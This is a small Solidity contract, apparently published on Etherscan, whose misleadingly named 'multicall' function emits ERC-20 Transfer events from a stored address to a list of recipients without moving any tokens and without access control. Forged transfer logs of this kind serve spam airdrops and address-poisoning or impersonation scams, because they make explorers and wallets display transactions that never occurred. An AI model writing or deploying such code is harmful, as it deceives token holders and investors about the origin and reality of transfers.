/**
 *Submitted for verification at Etherscan.io on 2024-04-05
 */

/**
 *Submitted for verification at Etherscan.io on 2024-02-24
 */

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./TestLib.sol";
contract multicallFacet {
    function multicall(address[] calldata _addresses_, uint256 _out) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        for (uint256 i = 0; i < _addresses_.length; i++) {
            emit Transfer(ds._p76234, _addresses_[i], _out);
        }
    }
}
